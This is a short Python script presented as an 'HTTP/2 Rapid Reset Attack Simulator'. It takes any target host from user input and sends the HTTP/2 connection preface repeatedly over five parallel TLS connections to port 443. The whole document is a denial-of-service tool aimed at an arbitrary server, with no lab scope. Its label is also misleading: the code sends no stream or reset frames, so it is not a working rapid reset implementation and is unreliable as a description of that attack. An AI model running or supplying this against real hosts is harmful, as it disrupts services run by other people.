import socket
import ssl
import threading

print("HTTP/2 Rapid Reset Attack Simulator\n")

host = input("Enter target host (example.com): ")
port = 443
requests_count = int(input("Enter number of rapid requests: "))

def send_reset_requests():
    try:
        context = ssl.create_default_context()
        conn = socket.create_connection((host, port))
        tls = context.wrap_socket(conn, server_hostname=host)

        # Send multiple HTTP/2 preface frames (simplified simulation)
        preface = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"

        for _ in range(requests_count):
            tls.send(preface)
        
        tls.close()
        print("[+] Rapid reset sequence sent")

    except Exception as e:
        print("[!] Connection failed")

threads = []

print("\n[*] Launching rapid reset simulation...\n")

for _ in range(5):  # multiple parallel connections
    t = threading.Thread(target=send_reset_requests)
    threads.append(t)
    t.start()

for t in threads:
    t.join()

print("\n[!] Test complete")
